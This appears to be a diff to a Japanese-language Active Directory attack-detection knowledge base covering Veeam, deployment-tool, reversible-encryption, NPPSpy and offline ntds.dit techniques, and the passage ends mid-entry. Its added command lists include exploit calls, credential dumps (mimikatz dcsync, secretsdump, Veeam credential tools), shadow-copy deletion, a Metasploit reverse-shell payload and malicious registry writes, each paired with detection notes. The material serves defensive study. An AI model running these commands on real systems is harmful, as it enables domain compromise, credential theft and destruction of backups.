     "summary": "AD 参加かつ全被管理ホストへ到達可能で、ドメイン管理者/サービスアカウントを構成DBにキャッシュする Veeam Backup & Replication (VBR) サーバーを未認証 RCE で掌握する横展開。CVE-2024-40711 の pre-auth .NET 逆シリアル化で SYSTEM を得た後、構成DBの資格情報を回収し、ローカル管理者を作成、被管理ホストへ展開し、最後にリストアポイントを消して復旧能力ごと破壊する。単一の Veeam ボックス制圧がドメイン全体のレジリエンス崩壊に直結する。",
     "how": "前提は VBR サーバーへのネットワーク到達性のみで認証は不要。多くの環境で VBR は AD 参加かつ管理 VLAN から到達可能で、設計上ほぼ全ホストのバックアップ資格情報を握る。攻撃者は CVE-2024-40711 を悪用し、Backup.MountService (Veeam.Backup.MountService.exe, 既定 TCP 6170 の .NET Remoting エンドポイント/PermanentSessionService) へ、ysoserial.net と SoapFormatter で生成し CDbCryptoKeyInfoWrapper でラップした二重 BinaryFormatter ペイロードを送り込み、ブラックリストに未登録だった System.Runtime.Remoting.ObjRef ガジェットで検証を回避して Deserialize を発火させ、VBR 上で SYSTEM 権限の任意コード実行を得る(重要:RCE の窓口は 6170=.NET Remoting であり、TCP9401=Veeam.Backup.Service.exe(WCF)は後述 CVE-2023-27532 の別窓口。両者を取り違えないこと)。Veeam の修正は分割で、12.1.2.172 が不適切な認可のみを先に塞いで『認証必須』へ格下げし、続く 12.2.0.334 が逆シリアル化自体を修正した(公開時点は pre-auth・CVSS9.8)。SYSTEM を得た攻撃者は次に構成データベース (VeeamBackup, SQL Server Express または v12 の PostgreSQL) の [dbo].[Credentials] に格納された管理ホスト・アプリ資格情報を回収する(T1003)。これらは Veeam サービスアカウント/マシンの DPAPI 保護鍵で暗号化されており、SYSTEM ローカルでは Veeamp/VeeamGetCreds/VeeamDumper 等で直接復号でき、リモートからは CVE-2023-27532(Veeam.Backup.Service.exe の WCF エンドポイント TCP9401 が clientCredentialType=None で匿名接続を許し、認証前に内部メソッドを呼んで構成DBの資格情報を平文化)でダンプできる。回収されるのはしばしばドメイン管理者やサービスアカウントで、Veeam が全被管理ホストへ到達するため一気にドメイン規模の横展開が成立する。攻撃者は net user /add・net localgroup administrators /add でローカル管理者を作成(T1136.001)し、正規資格情報で被管理ホストへ縦横に展開(T1210/T1078.002)、最後にリストアポイント・リポジトリ・VeeamBackup DB を削除し vssadmin delete shadows / wbadmin delete catalog でシャドウ・カタログも消して復旧能力を破壊する(T1490)。Akira・Fog・Frag などのランサム集団がこの一連を実運用で用いている。",
     "tools": "watchTowr / 公開 PoC (CVE-2024-40711), ysoserial.net + SoapFormatter, Veeamp (VeeamBackup..Credentials ダンパ), VeeamGetCreds/Veeam-Get-Creds.ps1(PowerShell Empire モジュール), MWR-CyberSec VeeamDumper (.NET), Metasploit post/windows/gather/credentials/veeam_credential_dump (CVE-2023-27532), Impacket, Cobalt Strike, vssadmin/wbadmin/bcdedit, net.exe",
+    "cmd": [
+      {
+        "tool": "CVE-2024-40711",
+        "t": "Backup.MountService(TCP6170)へ未認証で二重逆シリアル化ペイロードを送りSYSTEM RCEに至る。`--targetveeam`が本PoC特有の引数",
+        "q": "CVE-2024-40711.exe -f binaryformatter -g Veeam -c http://10.0.0.5:8000/trigger --targetveeam 10.0.0.10"
+      },
+      {
+        "tool": "VeeamHax.exe",
+        "t": "CVE-2023-27532でTCP9401の匿名WCF接続から構成DB資格情報を窃取・実行。6170とは別ポート・別サービスである点に注意",
+        "q": "VeeamHax.exe --target 10.0.0.10 --cmd whoami"
+      },
+      {
+        "tool": "NetExec",
+        "t": "保守が続くveeamモジュールでVeeamBackup..Credentialsを一括抽出。SMB接続元がVeeamサーバ以外なら即座に異常",
+        "q": "nxc smb 10.0.0.10 -u administrator -p 'Passw0rd!' -M veeam"
+      },
+      {
+        "tool": "VeeamDumper.exe",
+        "t": "VBRサーバ上でローカル実行しMSSQL版構成DBの資格情報をDPAPI復号。ローカル実行のためEID1でプロセス生成が捕捉可能",
+        "q": "VeeamDumper.exe mssql -u \"svc_veeam@corp.local\""
+      },
+      {
+        "tool": "T-SQL",
+        "t": "構成DBへの生T-SQLでの直接窃取。`dbo.Credentials`テーブルへの素のSELECTはVeeam自身のサービス以外からはまず発行されない",
+        "q": "SELECT user_name,password FROM VeeamBackup.dbo.Credentials;"
+      },
+      {
+        "tool": "vssadmin.exe",
+        "t": "資格情報回収後の復旧能力破壊。Akira/Fog/Frag等のランサム運用で共通する最終ステップで単体でも高忠実度シグナル",
+        "q": "vssadmin.exe delete shadows /all /quiet && wbadmin.exe delete catalog -quiet"
+      }
+    ],
     "detect": "中核は VBR ホストのプロセス系譜:Veeam.Backup.MountService.exe / Veeam.Backup.Service.exe が cmd.exe・powershell.exe・net.exe・conhost.exe を子生成することは正当運用ではほぼ無く高い異常。続いて (1) SYSTEM 権限での net user /add・net localgroup administrators /add(ローカル管理者作成)、(2) VeeamBackup 構成DBの Credentials への異常アクセスや Veeamp/VeeamGetCreds/VeeamDumper 相当プロセス、(3) リストアポイント・リポジトリ削除や vssadmin delete shadows / wbadmin delete catalog / bcdedit recoveryenabled no。ネットワークでは外部/横方向から TCP 6170(MountService/.NET Remoting)・9401(Backup.Service/WCF)への異常着信。テレメトリ源:MDE DeviceProcessEvents/DeviceNetworkEvents、Windows 4688/4720/4732、Sysmon 1/3/10、PowerShell 4104、Veeam ログ(C:\\ProgramData\\Veeam\\Backup\\Svc.VeeamBackup.log 等)、SQL Server 監査(VeeamBackup..Credentials 参照)。オンプレ・エンドポイント信号が主で Entra/クラウド監査は原則無関係。",
     "events": "4688(Veeam.Backup.MountService.exe/Veeam.Backup.Service.exe→cmd.exe/powershell.exe/net.exe 生成), 4720(ローカルユーザー作成)/4732(Administrators 追加), Sysmon ID1(プロセス生成)/ID3(6170・9401 着信)/ID10(Veeam サービス・SQL プロセスへのハンドルアクセス), 4104(PowerShell ScriptBlock), Veeam ログ(C:\\ProgramData\\Veeam\\Backup\\*.log), SQL 監査(VeeamBackup..Credentials 参照), Microsoft-Windows-Backup 524(System catalog was deleted/wbadmin delete catalog)・vssadmin/bcdedit によるシャドウ・回復無効化(T1490)",
     "mitigate": "最優先は VBR を 12.2.0.334 以上へ更新(12.1.2.172 は認可のみ修正で逆シリアル化は未修正のため不十分、必ず 12.2.0.334 で完全修正)。CVE-2023-27532 は 12(12.0.0.1420 P20230223)/11a(11.0.1.1261 P20230227) 以降で修正済みのため併せて適用。VBR 管理コンソール・サービス(6170/9401/9392/9393 等)を管理境界のみへ制限し、インターネット・一般 VLAN からの到達を排除、可能なら専用管理ネットワークへ隔離する。VBR を DC やドメイン管理者と同一資格情報で運用せず、被管理ホスト接続には最小権限の専用アカウントを用い gMSA/分離を徹底。バックアップは Immutable(WORM/オブジェクトロック)・オフライン(エアギャップ)コピーを保持しリポジトリ削除を防ぐ。VBR サービスの子プロセス生成・ローカル管理者作成・構成DB参照を EDR で継続監視し、MFA と最新化を適用する。",
@@ -10937,6 +17793,38 @@ AD.I18N.ja.attacks = [
     "summary": "PDQ Deploy/Tanium/Ansible(AWX)/SaltStackといった非Microsoftの展開・構成管理コンソールまたはそのサービスアカウントを掌握し、悪性のパッケージ/アクション/プレイブック/ステートを作成して管理下エンドポイント全台でSYSTEM(root)実行させる横展開手法。SCCMと同格の「1操作=フリート全台でSYSTEM」を実現し、SaltStackではsalt-masterの未認証RCE(CVE-2020-11651)で認証すら不要になる。SCCMを持たない企業ではこれらが標準の一斉実行経路となるため必須の検知対象。",
     "how": "前提として展開/構成管理サーバ本体かそのサービスアカウントを奪取するか、SaltStackのように未認証の脆弱性(CVE-2020-11651)でmasterを直接掌握する。PDQ Deployでは、コンソール/サービスアカウントから悪性の「パッケージ」(Install/Command Step)を作成し対象コレクションへ展開すると、PDQがADMIN$/IPC$(445/SMB)へ接続してターゲット上にPDQDeployRunner-<n>.exeサービスを一時作成し、Stepを既定でSYSTEM(または設定した展開ユーザ)として実行する。Taniumでは、RBAC権限でパラメータ化コマンドを含むContent Set/Packageを作り、Action Group/Computer GroupへActionを発行すると、各端末のTaniumClient.exe(SYSTEM)がTaniumExecWrapper.exe経由でペイロードをSYSTEM実行する。Ansibleでは制御ノードまたはAWX/Tower・Semaphoreの資格情報から、win_shell/win_command(WinRM 5985/5986)やshell/command+become(SSH)を含むプレイブックのJob Templateをインベントリ全体へ流し、Windows標的ではwsmprovhost.exeがpowershellを、Linuxでは接続/become(root)アカウントでコマンドを一斉実行する。SaltStackでは、salt-master掌握後にsalt '*' cmd.run/state.applyを4505(pub)/4506(ret)のZeroMQで全minionへ配信し、root/SYSTEMで稼働するsalt-minionが即時実行する。CVE-2020-11651はsalt-masterのClearFuncsが_send_pub/_prep_auth_infoをトークン検証なしで4506リクエストサーバ上に公開する欠陥で、未認証攻撃者がジョブを発行しmaster署名鍵(root_key)まで奪えるため、master自身と全minionでroot RCEに至り、2020年に大規模自動悪用でクリプトマイナーが投下された。CVE-2020-11652のディレクトリトラバーサルは任意ファイル読取・鍵窃取で悪用を補助する。いずれも正規の管理配信チャネルを使うためEDR上は正常運用と紛れやすく、1つのパッケージ/ジョブ/ステートがフリート全台でSYSTEM実行される点でSCCMと同等の破壊力を持つ。",
     "tools": "PDQ Deploy/PDQ Connect, Tanium (Package/Action), Ansible / AWX (Tower) / Semaphore, SaltStack salt-run/salt '*'/state.apply, Metasploit exploit/linux/misc/saltstack_salt_unauth_rce (CVE-2020-11651), salt-master unauth PoC (jsecurity101/kevthehermit)",
+    "cmd": [
+      {
+        "tool": "Ansible",
+        "t": "WinRM経由で全Windows対象へ一斉実行するアドホックコマンド。対象群全台の`wsmprovhost.exe`が同時に`powershell.exe`を生成",
+        "q": "ansible windows -i inventory.ini -m ansible.windows.win_shell -a \"whoami\""
+      },
+      {
+        "tool": "TaniumClient.exe",
+        "t": "Tanium Actionはコンソール/API経由でコマンドラインは残らず、SYSTEM権限の`TaniumClient.exe`が直接ペイロードを子プロセス生成する点が観測点",
+        "q": "cmd.exe /c whoami"
+      },
+      {
+        "tool": "SaltStack",
+        "t": "salt-master掌握後に全minionへ即時一斉配信。ワイルドカード`'*'`宛の`cmd.run`はSCCM同様フリート規模のroot実行を意味する",
+        "q": "salt '*' cmd.run 'net user hacker Passw0rd123! /add'"
+      },
+      {
+        "tool": "SaltStack",
+        "t": "Ansibleのplaybookに相当するstateを全minionへ強制適用。単発コマンドより継続的な構成改変を伴い痕跡が長く残る",
+        "q": "salt '*' state.apply malicious_state"
+      },
+      {
+        "tool": "Metasploit",
+        "t": "salt-masterのClearFuncs認証バイパスを突く未認証RCE。認証情報が一切不要なため4506への到達性のみで成立する最高深刻度経路",
+        "q": "use exploit/linux/misc/saltstack_salt_unauth_rce\nset RHOSTS 10.0.0.30\nset payload cmd/unix/reverse_bash\nrun"
+      },
+      {
+        "tool": "PDQ Deploy",
+        "t": "ADMIN$経由で作成される一時サービス`PDQDeployRunner-<n>`がStepのコマンドを実行する実体。7045のサービス名パターンが指紋",
+        "q": "powershell.exe -ExecutionPolicy Bypass -File \\\\pdq01.corp.local\\repo$\\step.ps1"
+      }
+    ],
     "detect": "展開/構成管理エージェントがSYSTEMで対話シェルやスクリプトホストを子生成する兆候を監視する。すなわちPDQDeployRunner-*.exe、TaniumClient.exe/TaniumExecWrapper.exe、C:\\salt配下のpython.exe/salt-minion.exe、WinRMのwsmprovhost.exeを親としたcmd.exe/powershell.exeをEDR(DeviceProcessEvents/Sysmon 1/4688)で検知し、同一コマンドが短時間に多数ホストへ扇状展開されるフリートワイド実行を相関する。サーバ側では、非承認オペレータや異常な送信元からのパッケージ/Step・Package/Action・Job Template/プレイブック・saltステートの新規作成、salt-masterの4506(ZeroMQリクエストサーバ)への未認証接続で_prep_auth_info/_send_pub文字列を含む要求(CVE-2020-11651)、445/5985/4505への多数エンドポイントへの扇状発信を監視する。",
     "events": "Sysmon 1 / 4688 (PDQDeployRunner-*.exe・TaniumClient.exe/TaniumExecWrapper.exe・salt-minion(C:\\salt\\python.exe)・wsmprovhost.exe の子プロセス生成), 4624 Type 3 (展開サービスアカウント/WinRMログオン), 5985/5986 (WinRM Ansible), 4104 (WinRM経由PowerShell ScriptBlock), Sysmon 3 (445/5985/4505/4506 への扇状接続), 4697/7045 (PDQ/Salt/一時サービス作成), Tanium監査・AWX(Tower) Job ログ・salt-master/minion ログ・salt-api access log, Linux auth.log/secure (Ansible SSH/become)",
     "mitigate": "展開/構成管理コンソール(PDQ/Tanium/AWX/salt-master)とそのサービスアカウントをTier0資産として保護し、コンソール管理者にフィッシング耐性MFAを強制、サービスアカウントは非特権gMSAへ移す。パッケージ/Action/Job Template/saltステートの作成に承認ワークフロー(職務分掌)を課し、変更を監査アラート化する。管理サーバとエージェントの通信を分離ネットワークに閉じ、salt 4505/4506やWinRM 5985/5986のインターネット/広域露出を遮断し、REST salt-apiの外部露出も止める。SaltStackはCVE-2020-11651/11652を修正した2019.2.4/3000.2以降へ即時更新する。エージェントの自動更新とベースライン化した想定コマンドの逸脱検知を行う。",
@@ -10982,6 +17870,38 @@ AD.I18N.ja.attacks = [
     "summary": "対象アカウントのuserAccountControlにENCRYPTED_TEXT_PASSWORD_ALLOWED(0x80)を立てる、またはドメイン/PSOで『可逆暗号を使用してパスワードを保存する』を有効化すると、以降のパスワード変更時にDCがsupplementalCredentials属性のPrimary:CLEARTEXTへ、RC4で可逆暗号化(DCのブートキー/SYSKEYで復号可能)したパスワードを保存する。攻撃者はこれを後日DCSyncで読み出し平文パスワードを回収する、認証プロセス改変型の永続化。ディレクトリを平文パスワード金庫に変え、IRがパスワードを一斉リセットしてもフラグ/ポリシーが残る限り将来の新パスワードまで平文で採取でき、『全部リセット』の封じ込めを無効化する。",
     "how": "前提はフラグ/GPO/PSOを書き込める権限(個別アカウントなら対象へのWriteProperty、ドメイン全体なら既定ドメインポリシーの編集権)。個別アカウントでは対象のuserAccountControlにENCRYPTED_TEXT_PASSWORD_ALLOWED(0x80 / 10進128)を追加する(Set-ADUser -AllowReversiblePasswordEncryption $true、Set-ADAccountControl、dsmod user -reversiblepwd yes、PowerViewのSet-DomainObject、ADSI/ldapmodify等)。ドメイン全体なら『コンピューターの構成>Windowsの設定>セキュリティの設定>アカウントポリシー>パスワードのポリシー>可逆暗号を使用してパスワードを保存する』を有効化(GptTmpl.infの ClearTextPassword=1)、特定グループに絞るならPSO(msDS-PasswordSettings)の msDS-PasswordReversibleEncryptionEnabled=TRUE を用いる。重要な性質として、このフラグ/ポリシーは既存の格納値を遡って平文化しない — 有効化後に発生する次回パスワード設定/変更(4724リセット/4723変更)で初めてDCがsupplementalCredentialsのPrimary:CLEARTEXTパッケージへ値を書き込むため、攻撃者はフラグを立てた後に強制リセットするか次回変更を待つ。格納値は文字どおりの平文ではなくRC4で可逆暗号化されており、DCのブートキー(SYSKEY)で復号できる。攻撃者はDCSync(Replicating Directory Changes、mimikatz lsadump::dcsync や impacket secretsdump.py -just-dc)で対象アカウントの秘密を複製させ、ツール側がPrimary:CLEARTEXTを復号して平文としてダンプする(secretsdumpは『ユーザー:CLEARTEXT:パスワード』形式で表示)。特権/サービスアカウントに一度仕込めば、リセット後の新パスワードが再び平文化されるため封じ込めをすり抜け、VPN/OWA/クラウド等で再利用可能な平文を継続入手できる。フラグ設定・GPO/PSO変更は正規の4738/5136/4739として必ず記録される、検知可能な直接的ディレクトリ変更である点が防御側の勘所。",
     "tools": "Set-ADUser -AllowReversiblePasswordEncryption / Set-ADAccountControl (ActiveDirectoryモジュール), dsmod user -reversiblepwd yes, PowerView (Set-DomainObject でuserAccountControl操作), ADSIEdit / ldapmodify, GPMC(可逆暗号GPO)・PSO作成, mimikatz (lsadump::dcsync), impacket secretsdump.py (-just-dc)",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "対象のuserAccountControlにENCRYPTED_TEXT_PASSWORD_ALLOWED(0x80)を追加。次回パスワード変更(4723/4724)からPrimary:CLEARTEXTが書かれ始める",
+        "q": "Set-ADUser -Identity svc_user -AllowReversiblePasswordEncryption $true"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "同じUACフラグをより直接的なcmdletで設定。フラグ変更自体は4738(アカウント変更)として即座に記録される",
+        "q": "Set-ADAccountControl -Identity svc_user -AllowReversiblePasswordEncryption $true"
+      },
+      {
+        "tool": "dsmod.exe",
+        "t": "OS標準LOLBinでも同じフラグを設定可能。正規運用スクリプトと紛れやすく単体では低忠実度なため直後のパスワード変更と相関させる",
+        "q": "dsmod user \"CN=svc_user,OU=Service Accounts,DC=corp,DC=local\" -reversiblepwd yes"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "ドメイン既定ポリシーのGptTmpl.infを直接改竄しGPO側で可逆暗号化を有効化。`ClearTextPassword = 1`という文字列自体が改竄の直接証拠",
+        "q": "(Get-Content 'D:\\SYSVOL\\domain\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf') -replace 'ClearTextPassword = 0','ClearTextPassword = 1' | Set-Content 'D:\\SYSVOL\\domain\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf'"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "フラグ設置後の新パスワードをDCSyncで回収。Primary:CLEARTEXTパッケージを復号し平文をそのまま表示する",
+        "q": "mimikatz.exe \"lsadump::dcsync /domain:corp.local /user:svc_user\" exit"
+      },
+      {
+        "tool": "Impacket",
+        "t": "`-just-dc`でDCSync相当を実行しPrimary:CLEARTEXTを復号。出力の`ユーザー:CLEARTEXT:パスワード`という行自体が悪用成立の動かぬ証拠",
+        "q": "secretsdump.py -just-dc corp.local/administrator@10.0.0.10"
+      }
+    ],
     "detect": "ディレクトリ変更監査(5136)でuserAccountControl属性にENCRYPTED_TEXT_PASSWORD_ALLOWED(0x80)ビットが追加された変更、および4738(アカウント変更; New UAC Value)を主信号として監視する。ドメイン全体routeはアカウントポリシー変更(4739)やSYSVOL GptTmpl.infの ClearTextPassword=1、PSO routeは5136でmsDS-PasswordReversibleEncryptionEnabled=TRUEを検知。設定後のパスワード再設定(4724/4723=平文格納の契機)と、後日のDCSync読取(4662 Replicating Directory Changes GUID 1131f6aa/1131f6ad)を相関する。加えてLDAPスイープ (userAccountControl:1.2.840.113556.1.4.803:=128) や Get-ADDefaultDomainPasswordPolicy/Get-ADFineGrainedPasswordPolicy の ReversibleEncryptionEnabled、Get-ADUser -Properties AllowReversiblePasswordEncryption で既存のフラグ持ちアカウント・ポリシーを定期棚卸しする。平文化・DCSync復号自体はDC内部処理でEDR不可視のため、ディレクトリ監査とLDAP棚卸しが主軸。",
     "events": "5136(ディレクトリオブジェクト変更; userAccountControl または msDS-PasswordReversibleEncryptionEnabled 属性変更、要ディレクトリサービス変更監査+SACL), 4738(ユーザーアカウント変更; New UAC Value に ENCRYPTED_TEXT_PASSWORD_ALLOWED が付与), 4739(ドメインポリシー変更; アカウントポリシーの可逆暗号有効化), 4724/4723(パスワードリセット/変更=Primary:CLEARTEXT格納の契機), 4662(Replicating Directory Changes=DCSync読取; GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 / 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)",
     "mitigate": "既定どおり可逆暗号を無効(Default Domain Policy の ClearTextPassword=0)に保ち、5136/4738/4739の監査を有効化してUAC 0x80設定・可逆暗号ポリシー有効化を高優先アラート化する。LDAPスイープ (userAccountControl:1.2.840.113556.1.4.803:=128) と Get-ADDefaultDomainPasswordPolicy/Get-ADFineGrainedPasswordPolicy の ReversibleEncryptionEnabled を定期実行し、フラグ持ちアカウント・PSO・GPOを棚卸しする。特権/サービスアカウントへのuserAccountControl書込権限を最小化(委任ACLの棚卸し)し、DCSync(Replicating Directory Changes)権限保有主体を絞る。フラグ/ポリシーを発見したら即解除し、露出した全アカウントのパスワードを強制リセットする(有効化中に変更されたパスワードは既に平文化・漏洩済みと扱う)。可逆暗号を要求するレガシープロトコル(CHAP/MS-CHAP、IIS Digest等)は排除または個別PSOで限定し、文書化と変更管理下に置く。",
@@ -11027,6 +17947,28 @@ AD.I18N.ja.attacks = [
     "summary": "Winlogonのネットワークプロバイダ機構を悪用し、悪意あるプロバイダDLLをレジストリ登録して、対話/RDPログオンやパスワード変更のたびに平文パスワードをファイルへ傍受・記録する認証プロセス改変型の永続化。mpnotify.exeがNPLogonNotify()/NPPasswordChangeNotify()経由で平文資格情報をDLLへ引き渡す正規APIをそのまま利用するため、LSASSにも触れずkrbtgtも要さず、Credential Guard/LSA Protection(RunAsPPL)では防げない。DCや管理ジャンプホストに設置すると再起動やパスワード変更をまたいで平文を静かに収集し続ける。ただし平文露出を断つネイティブ対策は存在し、MPR通知の無効化(EnableMPRNotifications=Disabled、Windows 11 24H2/Server 2025では既定で無効)が直接の緩和となる。",
     "how": "設置先ホスト(DCや管理ジャンプホスト)上のローカル管理者/SYSTEM権限が前提。Windowsはログオン時にWinlogonがmpnotify.exeを起動し、資格情報をRPCで受け渡す。mpnotify.exeはHKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\OrderのProviderOrder(プロバイダ名のカンマ区切りリスト、既定はRDPNP,LanmanWorkstation,webclient)に列挙された各ネットワークプロバイダDLLのNPLogonNotify()エクスポートを順に呼び出す。この呼び出しにはMSV1_0_INTERACTIVE_LOGON相当の構造体としてアカウント名・ドメイン・平文パスワードが渡される仕様で、攻撃者はここに割り込む。登録は二部構成で、(1)ProviderOrderリストへ自作プロバイダ名を追加/挿入し、(2)サービスサブキーHKLM\\SYSTEM\\CurrentControlSet\\Services\\<name>\\NetworkProviderを作成してProviderPath値(REG_EXPAND_SZ)を攻撃者DLLへ向け、Class=2(REG_DWORD)/Nameを設定する。ただしこれは実サービスではなく、SCMのCreateServiceを経ずレジストリ直書きで登録されるため、通常のサービスとしては起動しない。次回以降のログオンでmpnotify.exeが当該DLLをロードし、受け取った平文資格情報をDLLがフラットファイル(NPPSpy既定ではC:\\NPPSpy.txt。実インシデントではC:\\Windows\\Temp配下やC:\\Users\\Public配下等、出力名はビルド時ハードコードで可変)へ書き出す。Grzegorz TworekのNPPSpyがこの手順を自動化する。NPPSpy2はこれをパスワード変更経路へ拡張した亜種で、Ctrl+Alt+Delのパスワード変更時に呼ばれるNPPasswordChangeNotify()をDLLでフックし、旧・新パスワードを平文で捕捉する(自前のカスタムプロバイダDLLを用いる点はNPPSpyと同じ。既存プロバイダのログ機能を流用するものではない)。実際の侵入(2026年5月 Microsoft報告のmslogon.dll事例、DC上に設置)では、単一のプロバイダDLLがNPLogonNotifyとNPPasswordChangeNotifyの両方を実装し、サインインとパスワード変更の双方で平文を回収していた。本手法はLSASSアクセス・メモリパッチ・DCSync/krbtgtを一切伴わず、正規のプロバイダAPIとレジストリ設定のみで成立するため、Credential GuardやLSA Protection(RunAsPPL)では阻止できず、他のLSA実装型(Skeleton Key/悪性SSP/Password Filter DLL)と決定的に異なる。捕捉は対話/RDPログオン(Logon Type 2/10)で確実だが、平文を伴わないネットワークログオン(Type 3)等は取得できず、ログオン種別により取得完全性は変動する。再起動・パスワード変更をまたいで有効で、変更後は次回ログオンで新パスワードをそのまま捕捉する。",
     "tools": "NPPSpy, NPPSpy2 (Grzegorz Tworek / PSBits), ricardojoserf/network-providers (NPPSpy2派生), mslogon.dll(実インシデント検体), reg.exe / PowerShell(レジストリ登録), 任意のカスタムNetwork Provider DLL",
+    "cmd": [
+      {
+        "tool": "reg.exe",
+        "t": "NetworkProvider\\OrderのProviderOrderへ自作プロバイダ名を追記。既定値`RDPNP,LanmanWorkstation,webclient`に見慣れない名前が増える1行が起点",
+        "q": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" /v ProviderOrder /t REG_SZ /d \"RDPNP,LanmanWorkstation,webclient,NPPSpy\" /f"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "SCMのCreateServiceを経由せずサービスキーを直接作成しDLLパスを登録。7045(新規サービス)が出ないためレジストリ監査だけが頼り",
+        "q": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider\" /v ProviderPath /t REG_EXPAND_SZ /d \"%SystemRoot%\\System32\\NPPSPY.dll\" /f"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "Class=2とName値を追加しmpnotify.exeにNPLogonNotify実装DLLとして認識させる登録の最終ステップ",
+        "q": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider\" /v Class /t REG_DWORD /d 2 /f"
+      },
+      {
+        "tool": "NPPSpy",
+        "t": "悪性プロバイダDLLを配置。Sysmon EID 11の新規DLL作成と直後のNetworkProvider登録の組み合わせが高忠実度",
+        "q": "copy NPPSPY.dll C:\\Windows\\System32\\NPPSPY.dll"
+      }
+    ],
     "detect": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\OrderのProviderOrder値と、各Services\\<name>\\NetworkProvider\\ProviderPath値への追加・変更を監視する(4657はNetworkProviderキーへのSACL監査が前提、Sysmon EID13、DeviceRegistryEvents)。ProviderPathが未署名/非Microsoft署名のDLLや%TEMP%・ユーザ書込み可能パスを指す点が高信頼シグナル(既知の標準DLLはntlanman.dll/drprov.dll/davclnt.dll/cscdll.dll等)。mpnotify.exe/winlogon.exeが標準プロバイダDLL以外・非System32のDLLをロードする挙動(Sysmon EID7, DeviceImageLoadEvents)を相関する。平文資格情報を書き出すフラットファイルの生成(Sysmon EID11)は補助シグナルだが、出力ファイル名はビルド時ハードコードで可変のため低信頼。注意: ネットワークプロバイダはSCM経由の実サービスではなくレジストリ直書きで登録されるため、7045/4697(サービスインストール)は通常発火しない。レジストリ値/キー監査(4657/Sysmon EID13/DeviceRegistryEvents)を主軸とし、ProviderOrderのベースラインを取り差分を定期照合する。",
     "events": "4657(ProviderOrder/ProviderPath値変更; NetworkProviderキーへのSACL監査が必要), Sysmon 13(RegistryValueSet), Sysmon 7(mpnotify.exe/winlogon.exeへの非標準・未署名DLLロード), Sysmon 11(捕捉した平文資格情報ファイルの生成; ファイル名可変で低信頼), 4624(Logon Type 2/10=捕捉が発生する対話/RDPログオンの相関)。※7045/4697(サービス作成)はSCMを介さないレジストリ直書き登録のため通常は発火しない点に留意。",
     "mitigate": "最重要ネイティブ対策: MPR通知の無効化(MITRE M1028)。GPO『システムの MPR 通知を有効にする(Enable MPR notifications for the system)』をDisabled、またはHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableMPRNotifications=0にすると、Winlogonがネットワークプロバイダへ渡す認証情報のパスワード欄が空になり、平文露出そのものを断てる。Windows 11 24H2/Server 2025では既定で無効、22H2以前は『未構成=有効(平文送出)』のため明示的にDisabled化する(サードパーティSSO/プロファイル製品がMPR通知に依存する場合は影響評価が必要)。加えて、ProviderOrderリストと各ProviderPathをベースライン化し未知プロバイダの追加を変更アラート化(M1047)、NetworkProvider配下レジストリの書込みをTier0管理者に限定しSACL監査を有効化(M1024)、WDAC/AppLockerでmpnotify.exe/winlogonへの未署名DLLロードを禁止する。重要: LSASSに触れないためCredential GuardやLSA Protectionでは防げず、上記MPR通知無効化+レジストリ完全性監視+DC/特権端末での特権アカウントの対話/RDPログオン最小化(平文の露出そのものを減らす)を主対策とする。",
@@ -11072,6 +18014,38 @@ AD.I18N.ja.attacks = [
     "summary": "オフライン状態のntds.dit(IFM/ntdsutilバックアップ、窃取したVSSコピー、退役DCのディスク)をDSInternalsで直接開き、バックドアのパスワード/NTハッシュ、特権グループへのprimaryGroupID書き換え、休眠アカウントの有効化・ロック解除・userAccountControl改変による乗っ取り、任意sIDHistoryをレコードへ書き込む永続化手法。ライブDCを一切経由しないため、5136(オブジェクト変更)・DCShadow(5137/5141)・DCSync(4662)といった成熟SOCが依存する書き込み系イベントを一切発火させずに資格情報や特権を仕込める。既定では各cmdletが正当な複製メタデータ(uSNChanged・属性version・起点DSA・時刻)を付与するため、改竄DBを現用へ戻すと変更は「正規の起点書き込み」として振る舞い外部DCへ複製される(-SkipMetaUpdate指定時のみ複製されずローカル限定)。LDAPが拒否する任意sIDHistory(例: Enterprise Admins SID 519)やprimaryGroupID書き換えもオフラインなら制約を受けずに通る点が本質。なお証明書ログオン用msDS-KeyCredentialLink(Shadow Credentials)を注入する専用オフラインcmdlet(俗称Add-ADDBKeyCredential)はDSInternalsに実在せず、本手法の主軸はパスワード/ハッシュ・primaryGroup・アカウント状態(有効化/ロック解除/UAC)・sIDHistoryの直接書換である。",
     "how": "前提としてオフラインのntds.dit本体と、その暗号化属性(unicodePwd/supplementalCredentials等)を復号するためのBootKey(SysKey)を保持するSYSTEMレジストリハイブを入手する。取得経路は ntdsutil の `activate instance ntds`→`ifm`→`create sysvol full <path>` によるIFMメディア生成、ライブDCのVSSシャドウコピー(vssadmin create shadow / diskshadow + esentutl /y /vss でntds.ditを吸い出す)、または退役DC/システムステートバックアップからの流用。ntds.ditはESE(JET Blue)データベースであり、DSInternalsはEsent Managed Interop経由でこれを直接オープンし、`Get-BootKey -SystemHivePath` で取り出したBootKeyを各オフラインcmdletへ `-BootKey` として渡してPEK(Password Encryption Key)を復号する。改竄本体は #91(sIDHistory書込)と差別化される非sIDHistoryペイロードが主軸で、`Set-ADDBAccountPassword`(平文パスワードを与えPEKで再暗号化し差し替え)/`Set-ADDBAccountPasswordHash`(NTハッシュを直接差し替えバックドア資格情報を仕込む)、`Set-ADDBPrimaryGroup`(primaryGroupIDを512等へ変更しmember属性を触らずにDomain 